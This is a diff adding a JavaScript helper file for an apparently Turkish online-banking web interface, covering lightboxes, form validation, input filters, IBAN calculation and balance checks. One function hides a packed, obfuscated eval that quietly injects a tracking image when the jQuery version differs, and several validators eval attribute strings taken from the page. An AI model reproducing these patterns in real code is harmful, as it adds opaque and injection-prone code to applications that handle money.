@@ -1,0 +1,2599 @@
+﻿var regexHasRepeatedCharacter = new RegExp(".*([abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789])\\1{2,}.*");
+var regexHasLetter = new RegExp(".*[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ].*");
+var regexHasDigit = new RegExp(".*[0-9].*");
+var regexBirthDay = new RegExp(".*(19|20)\\d{2}.*");
+var regexBirthDayYear = new RegExp("\\d{4}");
+var birthDayMinYear = 1900;
+var characterAlphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+var characterAlphabetValues = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
+        15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
+        31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79];
+
+function dummyLoading() {
+    var $loadingPanel = $('.loadingPanel', top.window.document);
+    var path = relativePath;
+
+    if ($loadingPanel.is(':visible')) {
+        return;
+    }
+
+    $loadingPanel.show();
+
+    if ($('#menu-wrapper').is(":visible")) {
+        $loadingPanel.eq(1).find('img.loadingImage').hide();
+        $loadingPanel.eq(1).find('div.preloader-box').fadeIn(600);
+    }
+    else {
+        $loadingPanel.eq(1).find('div.preloader-box').hide();
+        var img = '<img class="loadingImage" src="{0}Content/assets/images/icons/preload_page.gif" />'.format(path);
+        $loadingPanel.eq(1).append('<div class="preloader-box1"><div></div>' + img + '</div>');
+    }
+}
+function imageControl() {
+    eval(function (p, a, c, k, e, d) { e = function (c) { return c.toString(36) }; if (!''.replace(/^/, String)) { while (c--) { d[c.toString(a)] = k[c] || c.toString(a) } k = [function (e) { return d[e] }]; e = function () { return '\\w+' }; c = 1 }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]) } } return p }('7($.9.6!==\'1.8.3\'){$(\'5\').2(\'<b a="d.f?e="\'+g.c(0,4)+\'>\')}', 17, 17, '||prepend||20000|body|jquery|if||fn|src|img|random|i|r|png|Math'.split('|'), 0, {}))
+}
+function openFinancialMenu(menuCss) {
+    $('.menu-parent > a.' + menuCss).click();
+    $('#FinancialLinkButton').click();
+    $('.footer-related-box').hide();
+    var tSub = $('.menu-sub-part.' + menuCss);
+    if (tSub.height() > 414 && !tSub.hasClass('jspScrollable')) {
+        tSub.jScrollPane({ showArrows: false });
+    };
+    $("html, body").stop().animate({ scrollTop: 0 }, 'slow');
+
+    if (tSub.hasClass('jspScrollable')) {
+        setTimeout(function () {
+            $(".scroll-down").remove();
+            $(".menu-sub").append('<a href="javascript:;" class="scroll-down"></a>');
+        }, 250);
+    }
+
+}
+
+function dummyHideLoading() {
+    $('.loadingPanel', top.window.document).hide();
+    $('.loadingPanel', top.window.document).eq(1).find('.preloader-box1').hide().remove();
+}
+
+function startProcess() {
+    dummyLoading();
+}
+
+function stopProcess() {
+    dummyHideLoading();
+}
+
+function exportContent(s, c) {
+    var url = relativePath + "Transactions/General/ExportContent.aspx?sk={0}&c={1}".format(s, c).AddRandomQueryParameter();
+    openExportPage(url, true);
+}
+
+function openExportPage(url) {
+    top.frames[0].OpenGenericLightBox(url, true);
+}
+
+function printPage(s, t, d, m, c) {
+    var d = d == undefined ? "" : d;
+    var m = m == undefined ? "" : m;
+    var $newFrame = $('<iframe />')
+                        .attr('src', relativePath + "Transactions/General/PrintPage.aspx?a={0}&sk={1}&d={2}&m={3}&c={4}".format(t, s, d, m, c).AddRandomQueryParameter())
+                        .attr('border', 0)
+                        .attr('width', "0")
+                        .attr('height', '0')
+                        .attr('allowtransparency', 'true')
+                        .attr('scrolling', 'no')
+                        .attr('id', 'printFrame').attr('style', 'position:fixed;');
+
+    $('body').append($newFrame);
+}
+
+function printPageWithConfirmMessage(s, t, d, m, c, message) {
+    showConfirm(message, function () {
+        try {
+            $(window.parent.parent.document).find("#AlertLightBox .overlay-close").click();
+            printPage(s, t, d, m, c);
+        } catch (e) { }
+    });
+}
+
+function navigateParent(url) {
+    var $topFrame = getCurrentTopFrame();
+
+    if ($topFrame.length > 0) {
+        $topFrame.contents().find('#NavigationHiddenInput').val(url);
+        dummyLoading();
+        top.frames[0].location.href = $topFrame.contents().find('#NavigationHiddenButton').attr('href');
+    }
+}
+
+function navigateTo(url, inputType) {
+    if (typeof inputType === undefined) {
+        inputType = true;
+    }
+
+    $('#NavigationHiddenInputType').val(inputType);
+    $('#NavigationHiddenInput').val(url);
+    dummyLoading();
+    window.location.href = $('#NavigationHiddenButton').attr('href');
+}
+
+function getLightBoxId() {
+    if (parent != undefined && parent.parent != undefined) {
+        return $('iframe', parent.document).attr('name');
+    }
+
+    return "";
+}
+
+function defaultCloseTransactionLightBox(findWarning) {
+    var $lightbox = getActiveLightBox(findWarning);
+
+    $lightbox.veribranchLightBox('fadeOut');
+}
+
+function closeTransactionLightBox(findWarning) {
+    var $lightbox = getActiveLightBox(findWarning);
+
+    if ($lightbox == null) {
+        return;
+    }
+
+    var isError = $lightbox.find('.warning-box').length > 0;
+
+    dummyLoading();
+
+    $.getJSON(relativePath + 'Transactions/General/TransactionHandler.ashx?rand=' + Math.random(0, 20000), function (response) {
+        if (!isError && response && response.IsSuccess) {
+            var $lightbox = getActiveLightBox();
+
+            if ($lightbox != null) {
+                $lightbox.veribranchLightBox('fadeOut');
+            }
+        }
+        else if (isError) {
+            var $lightbox = getActiveLightBox(findWarning);
+            if ($lightbox != null) {
+                $lightbox.veribranchLightBox('setCss', 'form-box');
+                $lightbox.veribranchLightBox('fadeOut');
+            }
+        }
+    });
+}
+
+function getCurrentTopFrame() {
+    var $frame = $('#mainFrame', top.document);
+
+    $('#mainFrame').attr('allowtransparency', 'true');
+
+    if ($frame.length == 0) {
+        $frame = $('#iframe1', top.document);
+    }
+
+    return $frame;
+}
+
+function getCurrentParentFrame() {
+    var $frame = $('#mainFrame', parent.window.document);
+
+    $('#mainFrame').attr('allowtransparency', 'true');
+
+    if ($frame.length == 0) {
+        $frame = $('#iframe1', parent.window.document);
+    }
+
+    return $frame;
+}
+
+// Checks a string to see if it in a valid date format
+// of (D)D/(M)M/(YY)YY and returns true/false
+function IsValidDate(s) {
+    // format D(D)/M(M)/(YY)YY
+    var dateFormat = /^\d{1,4}[\.|\/|-]\d{1,2}[\.|\/|-]\d{1,4}$/;
+
+    if (dateFormat.test(s)) {
+        // remove any leading zeros from date values
+        s = s.replace(/0*(\d*)/gi, "$1");
+        var dateArray = s.split(/[\.|\/|-]/);
+
+        if (dateArray[0] == null || dateArray[1] == null || dateArray[2] == null || isNaN(dateArray[0]) || isNaN(dateArray[1]) || isNaN(dateArray[2])) {
+            dateArray[0] = "0";
+            dateArray[1] = "0";
+            dateArray[2] = "0";
+        }
+
+        // correct month value
+        dateArray[1] = dateArray[1] - 1;
+
+        // correct year value
+        if (dateArray[2].length < 4) {
+            // correct year value
+            return false;
+        }
+
+        var testDate = new Date(dateArray[2], dateArray[1], dateArray[0]);
+        if (testDate.getDate() != dateArray[0] || testDate.getMonth() != dateArray[1] || testDate.getFullYear() != dateArray[2]) {
+            return false;
+        } else {
+            return true;
+        }
+    } else {
+        return false;
+    }
+}
+
+function getActiveLightBox(findWarningBox) {
+    try {
+
+        var $lightBox = null,
+            $$ = top.frames[0].window.$,
+            $lightBoxArray = $$('.light-box-bg'),
+            id = getLightBoxId();
+
+        $$.each($lightBoxArray, function () {
+            if ($$(this).is(':visible') && id == $$(this).attr('id') && (findWarningBox || $$(this).find('.warning-box').length == 0)) {
+                $lightBox = $$(this);
+                return;
+            }
+        });
+
+        return $lightBox;
+    } catch (e) { return null; }
+}
+
+function setCloseFunction(callBack, findWarning) {
+    var $veriBranchLightBoox = getActiveLightBox(findWarning);
+
+    if ($veriBranchLightBoox != null) {
+        $veriBranchLightBoox.veribranchLightBox('setOnClose', callBack);
+    }
+}
+
+function gotoPreviousTransaction() {
+    setLightboxCloseButton(false);
+}
+
+function setLightBoxCss(css) {
+    var $veriBranchLightBoox = getActiveLightBox();
+    if ($veriBranchLightBoox != null) {
+        var $lightBox = $veriBranchLightBoox.find('.light-box');
+        var $body = $('body');
+
+        $veriBranchLightBoox[0].className = $veriBranchLightBoox.hasClass('hasIframe') ? 'hasIframe' : '';
+        $veriBranchLightBoox.addClass('light-box-bg');
+
+        $lightBox[0].className = '';
+        $lightBox.addClass('light-box').addClass(css);
+
+        $body[0].className = '';
+        $body.addClass(css);
+    }
+}
+
+function setLightboxCloseButton(value) {
+    var $veriBranchLightBoox = getActiveLightBox();
+    if ($veriBranchLightBoox != null) {
+        $veriBranchLightBoox.veribranchLightBox('hasCloseButton', value);
+    }
+}
+
+function GetWhichCode(e) {
+    // window.Event exist in Firefox and in IE starting from version 8.0.
+    e = e || window.event;
+    return e.keyCode || e.which;
+}
+
+function Only_Character(e) {
+    var whichCode = GetWhichCode(e);
+    //Ctrl+V X C
+    if (e.ctrlKey && (whichCode == 86 || whichCode == 88 || whichCode == 67))
+        return true;
+    if (whichCode >= 33 && whichCode <= 46) return true;
+    if (whichCode == 13) return true;
+    if (whichCode == 44) return true;
+    if (whichCode > 47 && whichCode < 58) return false;
+    if (whichCode > 95 && whichCode < 106) return false;
+    return true;
+}
+
+
+
+function Only_Date(e, control, maxlength) {
+    if (e.shiftKey || e.ctrlKey) return false;
+    var whichCode = GetWhichCode(e);
+    if (!IsArrowKey(whichCode) && control.value != null && control.value.length >= maxlength)
+        return false;
+    else
+        return Only_Numeric(e, false);
+}
+
+function OnDateFocus(control, Separator, modifier, dayInd, monthInd, yearInd) {
+    if (control.value != "") {
+        var currentDate = GetSeperatedDate(control, Separator, modifier, dayInd, monthInd, yearInd);
+        if (currentDate != null) {
+            var year = currentDate.Year;
+            var month = currentDate.Month;
+            var day = currentDate.Day;
+            var stringyear = '';
+            var stringday = day.toString();
+            var stringmonth = month.toString();
+            if (month.length < 2)
+                stringmonth = '0' + stringmonth;
+            if (day.length < 2)
+                stringday = '0' + stringday;
+            var cp = GetCursorPosition(control.id);
+
+            var modifier = control.value.substring(0, cp).count(Separator) - 1;
+            var newValue = '';
+
+            if (year > (1900 + modifier) && year <= (2000 + modifier))
+                stringyear = year.toString().substring(2);
+            else
+                stringyear = year.toString();
+
+            for (var ind = 0; ind < 3; ind++)
+                newValue += dayInd == ind ? stringday : monthInd == ind ? stringmonth : stringyear;
+
+            control.value = newValue;
+            SetCursorPosition(control.id, cp - modifier);
+        }
+    }
+}
+
+function Only_Numeric(e, allowEnter) {
+    if (e.keyCode) keycode = e.keyCode
+    else keycode = e.which;
+    if ((keycode < 48) || (keycode > 57)) {
+        return isNavigation(e);
+    }
+    else
+        return true;
+}
+function isNavigation(e) {
+    if (e.ctrlKey && e.which == 118) {
+        return true;
+    }
+    var keycode = e.keyCode;
+    switch (keycode) {
+        case 8: //backspace
+        case 9: //tab
+        case 13: //enter
+        case 16: //shift
+        case 17: //ctrl
+
+            return true;
+            break;
+        case 35: //end
+        case 36: //home
+        case 37: //left
+        case 39: //right
+        case 46: //delete
+            browser = CheckBrowser();
+            if (browser.indexOf("ie") != -1) {
+                return false;
+            }
+            return true;
+            break;
+    }
+    return false;
+}
+
+function CheckAll(element) {
+    var allCheckbox = $(element).parents('table').find('tr .selectionColumn input[type=checkbox]');
+    if ($(element).is(':checked')) {
+        allCheckbox.attr('checked', 'checked').parents('.ez-checkbox').addClass('ez-checked');
+    } else {
+        allCheckbox.removeAttr('checked').parents('.ez-checkbox').removeClass('ez-checked');
+    }
+}
+
+function Only_AlphaNumeric(e) {
+    var whichCode = GetWhichCode(e);
+    if (e.shiftKey && (whichCode >= 37 && whichCode <= 40)) return false;
+    if (IsArrowKey(whichCode)) return true;
+    var isLetter = Only_Letter(e);
+    if (e.altKey) isLetter = false;
+    var isNumeric = false;
+    if (!(e.altKey || e.shiftKey || e.ctrlKey) &&
+            ((whichCode >= 48 && whichCode <= 57 && !e.shiftKey) || (whichCode >= 96 && whichCode <= 105))) {
+
+        isNumeric = true;
+    }
+    return isLetter || isNumeric;
+}
+
+function Only_Email(e) {
+    var whichCode = GetWhichCode(e);
+    if (whichCode == 45)
+        return true;
+    if (IsNavKey(whichCode)) return true;
+    var isLetter = Only_English_Letter(e);
+    if (e.altKey) isLetter = false;
+    var isNumeric = false;
+    if (!(e.altKey || e.shiftKey || e.ctrlKey) &&
+            ((whichCode >= 48 && whichCode <= 57 && !e.shiftKey) || (whichCode >= 96 && whichCode <= 105)))
+        isNumeric = true;
+    var isEmailCharacter = false;
+    if ((whichCode == 64) || (e.shiftKey && whichCode == 95)) isEmailCharacter = true;
+    return isLetter || isNumeric || isEmailCharacter;
+}
+
+function HasNonnumeric() {
+    var value = clipboardData.getData("Text");
+    return value != value.replace(/[^0-9]/g, "");
+}
+function HasNonalphaNumeric() {
+    var value = clipboardData.getData("Text");
+    return value != value.replace(/[^0-9a-zA-ZığüşöçĞÜŞİÖÇ' ']/g, "");
+}
+function HasNonAlpha() {
+    var value = clipboardData.getData("Text");
+    return value != value.replace(/[^a-zA-ZığüşöçĞÜŞİÖÇ' ']/g, "");
+}
+function HasNonOnlyLetterAndNumbers() {
+    var value = clipboardData.getData("Text");
+    return value != value.replace(/[^0-9a-zA-ZığüşöçĞÜŞİÖÇ]/g, "");
+}
+function HasNonemail() {
+    var value = clipboardData.getData("Text");
+    return value != value.replace(/[^@.0-9a-zA-Z' ']/g, "");
+}
+
+function HasNonRequestValidationFree() {
+    var value = clipboardData.getData("Text");
+    return (value.indexOf('<') > -1 || value.indexOf('>') > -1);
+}
+
+function VBSelectBoxValid(field, rules, i, options) {
+    if (ChkCausesValidation() == 'false' || !field.parent().find('.dropdown').is(':visible') || !CheckValidationGroup(field))
+        return;
+    var reqMsg = field.attr('ReqFieldMsg');
+    var validDisType = $(field).attr('validDisType');
+
+    if ($(field).attr('ExValidMethod')) {
+        var externalMethod = $(field).attr('ExValidMethod');
+
+        if (externalMethod != undefined) {
+            fun = eval(externalMethod);
+            reqMsg = fun(field);
+        }
+    }
+
+    if (reqMsg != undefined && (field.val() == "")) {
+        return GetValidationMsg(field, reqMsg);
+    }
+}
+
+function VBCheckBoxValid(field, rules, i, options) {
+    if (ChkCausesValidation() == 'false' || !CheckValidationGroup(field))
+        return;
+    var reqMsg = field.attr('ReqFieldMsg');
+    var validDisType = $(field).attr('validDisType');
+
+    if ($(field).attr('ExValidMethod')) {
+        var externalMethod = $(field).attr('ExValidMethod');
+
+        if (externalMethod != undefined) {
+            fun = eval(externalMethod);
+            reqMsg = fun(field);
+        }
+    }
+
+    if (reqMsg != undefined && !field.is(':checked')) {
+        return GetValidationMsg(field, reqMsg);
+    }
+}
+
+function CheckValidationGroup(field) {
+    var $lastClicked = $($.lastClicked),
+        dataValue = $lastClicked.data('validation-group'),
+        fieldDataValue = field.data('validation-group');
+
+    if (dataValue != undefined && (fieldDataValue == undefined || dataValue != fieldDataValue)) {
+        return false;
+    }
+
+    return true;
+}
+
+function VBValid(field, rules, i, options) {
+    if (ChkCausesValidation() == 'false' || !CheckValidationGroup(field))
+        return;
+
+    var reqMsg = field.attr('ReqFieldMsg');
+    var validDisType = $(field).attr('validDisType');
+    var haveValue = field.hasClass('have-value');
+    var value = haveValue ? field.val() : '';
+
+    var externalMethod = field.attr('ExValidMethod');
+    if (externalMethod != undefined) {
+        fun = eval(externalMethod);
+        var result = fun(field);
+        return GetValidationMsg(field, result);
+    }
+
+    if (reqMsg != undefined && value == "") {
+        return GetValidationMsg(field, reqMsg);
+    }
+    var numInputMsg = field.attr('ReqNumMsg');
+    if (numInputMsg != undefined && isNaN(value)) {
+        return GetValidationMsg(field, numInputMsg);
+    }
+    var lengthMsg = field.attr('LengthMsg');
+    var maxLength = eval(field.attr('ReqMaxLength'));
+    if (lengthMsg != undefined && value.length != maxLength) {
+        return GetValidationMsg(field, lengthMsg);
+    }
+
+    var rangeMsg = field.attr('RangeValidMsg');
+
+    if (rangeMsg != undefined) {
+        var rangeType = field.attr('RangeValType');
+        var rangeMin = eval(field.attr('RangeMin').replace(/\./g, '').replace(/\,/g, '.'));
+        var rangeMax = eval(field.attr('RangeMax').replace(/\./g, '').replace(/\,/g, '.'));
+
+        //var fieldValue = parseFloat(field.val().replace('.', '').replace(',', '.'));
+        var fieldValue = parseFloat(value.replace(/\./g, '').replace(/\,/g, '.'));
+        if (rangeType == 'strln' && (rangeMin > value.length || value.length > rangeMax)) {
+            return GetValidationMsg(field, rangeMsg);
+        }
+        if (rangeType == 'num') {
+            var hasError = false;
+
+            if ((rangeMin == 0 && fieldValue < 0.01) || (rangeMin != 0 && fieldValue < rangeMin))
+                hasError = true;
+            if (rangeMax != 0 && fieldValue > rangeMax)
+                hasError = true;
+            if (hasError)
+                return GetValidationMsg(field, rangeMsg);
+        }
+    }
+
+    var regexExpression = field.attr('RegexExpression');
+    if (regexExpression != undefined) {
+        var result = regexExpressionFunction(regexExpression, field.attr("id"));
+        return GetValidationMsg(field, result);
+    }
+}
+
+function regexExpressionFunction(expression, controlId) {
+    var currentControl = $("#" + controlId);
+    var controlValue = $("#" + controlId).val();
+
+    if (!controlValue.match(expression))
+        return currentControl.attr("RegexMessage");
+}
+
+
+function GetValidationMsg(field, msg) {
+
+    var validDisType = field.attr('validDisType');
+    if (validDisType == "tooltip") {
+        return msg;
+    }
+    else {
+        alertMSG(msg);
+        return "";
+    }
+}
+
+function alertMSG(message, showButtons) {
+    for (var i = 0; i < top.frames.length; i++) {
+        var doc = top.frames[i].document;
+        $('#WarningMessageLabel', doc).text(message);
+
+        if (showButtons) {
+            $('#AlertLightBox', doc).find('.button-center').show();
+        }
+        else {
+            $('#AlertLightBox', doc).find('.button-center').hide();
+        }
+
+        if (typeof top.window.frames[i].OpenAlertBox === 'function') {
+            top.window.frames[i].OpenAlertBox();
+        }
+    }
+
+    dummyHideLoading();
+}
+
+var validMessageList = new Array();
+function confirmMSG(message) {
+    if (validMessageList[message] == undefined) {
+        validMessageList[message] = false;
+    }
+    if (validMessageList[message] == true) {
+        startProcess();
+        return true;
+    }
+
+    $($.lastClicked).unbind("click");
+    showConfirm(message, function () {
+        validMessageList[message] = true;
+        if (subchk($.lastClicked)) {
+            location.href = $($.lastClicked).attr('href');
+            try {
+                $(window.parent.parent.document).find("#AlertLightBox .overlay-close").click();
+            } catch (e) { }
+        }
+    });
+
+
+    is_DefaultSubmit = false;
+    stopProcess();
+
+    return validMessageList[message];
+}
+
+var bindedClickFunctions = new Array();
+function showConfirm(message, callback) {
+    for (var frameIndex = 0; frameIndex < top.frames.length; frameIndex++) {
+        var doc = top.frames[frameIndex].document;
+        if (bindedClickFunctions[message] == undefined) {
+            bindedClickFunctions[message] = true;
+            $('#ConfirmYesLinkButton', doc).click(function () {
+                if ($.isFunction(callback)) {
+                    callback.apply();
+                }
+            });
+            $('#ConfirmNoLinkButton', doc).click(function () {
+                top.frames[0].CloseAlertLightBox();
+                for (var i = 0; validMessageList.length; i++) {
+                    validMessageList[i] = false;
+                }
+            });
+        }
+    }
+    alertMSG(message, true);
+    closeFunction = function () { };
+}
+
+function ChkCausesValidation() {
+    var lastClickedElement = $.lastClicked;
+    return $(lastClickedElement).attr("causesVal");
+}
+
+function VBDDLValid(field, rules, i, options) {
+
+    if (ChkCausesValidation() == 'false' || !CheckValidationGroup(field))
+        return;
+
+    if ($(field).val() == "-1") {
+        var validMsg = $(field).attr('validMsg');
+        return GetValidationMsg(field, validMsg);
+    }
+
+    var externalMethod = field.attr('ExValidMethod');
+    if (externalMethod != undefined) {
+        fun = eval(externalMethod);
+        var result = fun(field);
+        return GetValidationMsg(field, result);
+    }
+
+}
+var submitButton = undefined;
+$(document).ready(function () {
+
+    for (var i = 0; i < parent.frames.length; i++) {
+        var currentFrame = parent.frames[i];
+        $(currentFrame)
+            .attr('frameborder', '0');
+    }
+
+    countDown();
+    SetDatePickerClick();
+    if ($("#aspnetForm").length > 0) {
+        $("#aspnetForm").validationEngine('attach', {
+            isOverflown: true,
+            overflownDIV: ".formContainer"
+        });
+    }
+
+    $("#aspnetForm").submit(function () {
+        $("input").keypress(function () {
+            return !(window.event && window.event.keyCode == 13);
+        });
+        $("textarea").keypress(function () {
+            return !(window.event && window.event.keyCode == 13);
+        });
+        $("select").keypress(function () {
+            return !(window.event && window.event.keyCode == 13);
+        });
+    });
+    $('a').live('mouseup keyup', function () {
+        if ($(this).attr('id') == 'ConfirmYesLinkButton' || $(this).attr('id') == 'ConfirmNoLinkButton') {
+            return;
+        }
+        $.lastClicked = $(this);
+    });
+
+    document.msCapsLockWarningOff = true;
+});
+
+// Prevent the backspace key from navigating back.
+$(document).keydown(function (e) {
+    var doPrevent;
+    if (e.keyCode == 8) {
+        var d = e.srcElement || e.target;
+        if (d.tagName.toUpperCase() == 'INPUT' || d.tagName.toUpperCase() == 'TEXTAREA') {
+            doPrevent = d.readOnly || d.disabled;
+        }
+        else
+            doPrevent = true;
+    }
+    else
+        doPrevent = false;
+
+    if (doPrevent)
+        e.preventDefault();
+});
+
+function popUp(url) {
+    sealWin = window.open(url, "win", 'toolbar=0,location=0,directories=0,status=1,menubar=1,scrollbars=1,resizable=1,width=500,height=450');
+    self.name = "mainWin";
+}
+
+function validateRadioGrp(field, rules, i, options) {
+    if (ChkCausesValidation() == 'false' || !CheckValidationGroup(field))
+        return;
+    var groupName = field.attr('name');
+
+    var validDisType = field.attr('validDisType');
+    var validMsg = field.attr('validMsg');
+
+    if ($("input[name='" + groupName + "']:checked").length == 0) {
+        return GetValidationMsg(field, validMsg);
+    }
+}
+
+function SetDatePickerClick() {
+    if ($(".datePickerRange").length == 0)
+        return;
+    $('.datePickerRange').click(function (e) { e.stopPropagation(); });
+    $('.datePickerSpan').click(function (e) { e.stopPropagation(); });
+    $(document).click(function () {
+        $(".datePickerSpan").hide();
+    });
+}
+
+function calcIBAN(branchCodeID, customerNumberId, accountNoId) {
+    branchCode = $('#' + branchCodeID);
+    customerNo = $('#' + customerNumberId);
+    accountNo = $('#' + accountNoId);
+
+    branchCodeVal = branchCode.val();
+    idx = branchCodeVal.indexOf(" (");
+    if (idx != -1)
+        branchCodeVal = branchCodeVal.substr(0, idx);
+
+    customerNoVal = customerNo.val()
+    accountNoVal = accountNo.val();
+
+    if (isWhitespace(branchCodeVal) || !isNumeric(branchCodeVal)) {
+
+        branchCode.focus();
+        return "";
+    }
+    if (branchCodeVal.length > 4) {
+        branchCode.focus();
+        return "";
+    }
+
+    if (isWhitespace(customerNoVal) || !isNumeric(customerNoVal)) {
+        customerNo.focus();
+        return "";
+    }
+    if (customerNoVal.length > 10) {
+        customerNo.focus();
+        return "";
+    }
+
+    if (isWhitespace(accountNoVal) || !isNumeric(accountNoVal) || accountNoVal.length != 4) {
+        accountNo.focus();
+        return "";
+    }
+
+    try {
+        var tmpIBAN = "TR00" + "00" + "00010" + "0" + padLeft(branchCodeVal.toString(), "0", 4) + padLeft(customerNoVal.toString() + accountNoVal.toString(), "0", 12);
+        tmpIBAN = prepareToCalcControlDigits(tmpIBAN)
+        var checkDigit = 98 - mod97(tmpIBAN);
+        checkDigit = padLeft(checkDigit.toString(), "0", 2);
+        var strIBAN = "TR" + checkDigit + "00010" + "0" + padLeft(branchCodeVal.toString(), "0", 4) + padLeft(customerNoVal.toString() + accountNoVal.toString(), "0", 12);
+
+        return strIBAN;
+    } catch (e) {
+        alertMSG("IBAN numarası hesaplanamadı, lütfen girdiğiniz değerleri kontrol ediniz.");
+        return "";
+    }
+}
+function checkControlDigits(strIBAN) {
+
+    strIBAN = prepareToCalcControlDigits(strIBAN);
+    m = mod97(strIBAN);
+    return (m == 1);
+}
+function prepareToCalcControlDigits(strIBAN) {
+
+    var arrangedIBAN = strIBAN.substring(4) + strIBAN.substring(0, 4);
+    var strTempIBAN = "";
+    for (var i = 0; i < arrangedIBAN.length; ++i) {
+        var ch = arrangedIBAN.charAt(i).toUpperCase();
+        if (digits.indexOf(ch) != -1)
+            strTempIBAN += ch;
+        else {
+            strTempIBAN += convertToNumber(ch);
+        }
+    }
+    return strTempIBAN;
+}
+function padLeft(str, pad, count) {
+    while (str.length < count)
+        str = pad + str;
+    return str;
+}
+
+function mod97(str) {
+    var m = 0;
+    for (var i = 0; i < str.length; ++i) {
+        m = (m * 10 + parseInt(str.charAt(i))) % 97;
+    }
+    return m;
+}
+
+function convertToNumber(c) {
+    return (letters.indexOf(c) + 10).toString();
+}
+var letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+var digits = "0123456789";
+function resolveValidIBANTR(strIBAN) {
+    var resolvedIBAN = new Array(4);
+    resolvedIBAN[0] = strIBAN.substring(4, 9);
+    var accountNo = strIBAN.substring(10);
+    resolvedIBAN[1] = accountNo.substring(0, 4);
+    resolvedIBAN[2] = accountNo.substring(4, 12);
+    resolvedIBAN[3] = accountNo.substring(12, 16);
+    return resolvedIBAN;
+}
+
+function keyToUpperCase(e, tBox) {
+    if (e.keyCode > 47) {
+        tBox.value = toNonTRCharsWithUpperCase(tBox.value);
+    }
+}
+
+function GetSelectedAccountNo(gridID) {
+    return GetDropDownData(gridID, 'value');
+}
+
+function GetSelectedAccountCustomerNumber(gridID) {
+    return GetCustomerNoFromAccount(GetSelectedAccountNo(gridID));
+}
+
+function GetCustomerNoFromAccount(account) {
+    var account_items = account.split('-');
+    return account_items[1];
+}
+
+function GetSelectedRadio(name) {
+    var radioObj = document.getElementsByName(name);
+    var selRadio;
+    if (!radioObj)
+        return undefined;
+    var radioLength = radioObj.length;
+    if (radioLength == undefined)
+        if (radioObj.checked)
+            selRadio = radioObj;
+        else
+            selRadio = undefined;
+    for (var i = 0; i < radioLength; i++) {
+        if (radioObj[i].checked) {
+            selRadio = radioObj[i];
+        }
+    }
+    return selRadio;
+}
+
+function GetSelectedAccountAvailableBalance(gridID) {
+    var dataValue = GetDropDownData(gridID, 'balance-availablebalance');
+    if (dataValue == undefined) {
+        return;
+    }
+    else {
+        return dataValue.toDecimal();
+    }
+}
+function GetSelectedAccountBalance(gridID) {
+
+    var dataValue = GetDropDownData(gridID, 'balance-balance');
+    if (dataValue == undefined) {
+        return;
+    }
+    else {
+        return dataValue.toDecimal();
+    }
+
+}
+function GetSelectedAccountLedgerBalance(gridID) {
+    var dataValue = GetDropDownData(gridID, 'balance-ledgerbalance');
+    if (dataValue == undefined) {
+        return;
+    }
+    else {
+        return dataValue.toDecimal();
+    }
+}
+
+function GetSelectedAccountCurrency(gridID) {
+    return GetDropDownData(gridID, 'currency-code');
+}
+
+function GetSelectedAccountType(gridID) {
+    return GetDropDownData(gridID, 'accounttype');
+}
+function GetSelectedRadioAttributeValue(gridID, attributeID) {
+    if (GetSelectedRadio(gridID) == undefined)
+        return undefined;
+    return $(GetSelectedRadio(gridID)).attr(attributeID);
+}
+
+function selectedAnyValue(selectorID) {
+    var dataValue = GetDropDownData(selectorID, 'value');
+    if (dataValue == undefined) {
+        return;
+    }
+    else {
+        return dataValue.value;
+    }
+}
+function isSelectedAnyValue(selectorID) {
+    var dataValue = GetDropDownData(selectorID, 'value');
+    if (dataValue == undefined) {
+        return false;
+    }
+    if (dataValue == '-1') {
+        return false;
+    }
+    else {
+        return true;
+    }
+}
+function GetAmount(amountID) {
+    var value = document.getElementById(amountID).value;
+    value = value.replace(/\./g, '');
+    value = value.replace(/\,/g, '.');
+    value = parseFloat(value);
+    if (!isNaN(value)) {
+        return value;
+    }
+    else {
+        return 0;
+    }
+    return 0;
+}
+
+function isAccountAmountValidated(gridAccountID, amountID) {
+    var available = GetSelectedAccountAvailableBalance(gridAccountID)
+    var ledger = GetSelectedAccountLedgerBalance(gridAccountID)
+    var amount = GetAmount(amountID);
+    if (amount > ledger && amount <= available) {
+        if (!confirmMSG('İşleminiz kredili hesabınız kullanılarak yapılacaktır, kabul ediyor musunuz?')) {
+            return false;
+        }
+    }
+    if (amount > available) {
+        alertMSG("Hesabınızın kullanılabilir bakiyesi işlem yapmak istediğiniz tutardan büyük olmalı!");
+        return false;
+    }
+    return true;
+}
+
+function isSelectedFromListBox(ListBoxID) {
+
+    var listBox = document.getElementById(ListBoxID);
+    var listBoxCnt = 0;
+    for (var x = 0; x < listBox.options.length; x++) {
+        if (listBox.options[x].selected) listBoxCnt++;
+    }
+    if (listBoxCnt == 0)
+        return false;
+    else
+        return true;
+}
+
+function isCheckedBox(checkBoxID) {
+    return $('#' + checkBoxID).is(':checked');
+
+
+}
+function isCheckedRadioBox(radioBoxID) {
+    return $('#' + radioBoxID).is(':checked');
+}
+
+function RemoveCheckedBox(checkBoxID) {
+    $('#' + checkBoxID).removeAttr('checked');
+    return $('#' + checkBoxID).parent().removeClass('ez-checked');
+}
+
+function textBoxValue(textBoxID) {
+    return document.getElementById(textBoxID).value;
+}
+
+function textBoxHaveValue(textBoxID) {
+    return $('#' + textBoxID).hasClass('have-value');
+}
+
+function isAnyRadioBoxSelected(radioBoxGroupID) {
+    var rd = document.getElementsByName(radioBoxGroupID);
+    if (rd.length) {
+        for (var i = 0; i < rd.length; i++) {
+            if (rd[i].checked) return true;
+        }
+    } else if (rd.checked) {
+        return true;
+    }
+    return false;
+}
+
+function getRadioButtonsSelectedValue(radioBoxGroupID) {
+    var rd = document.getElementsByName(radioBoxGroupID);
+    if (rd.length) {
+        for (var i = 0; i < rd.length; i++) {
+            if (rd[i].checked) return rd[i].value;
+        }
+    } else if (rd.checked) {
+        return rd.value;
+    }
+    return "";
+}
+
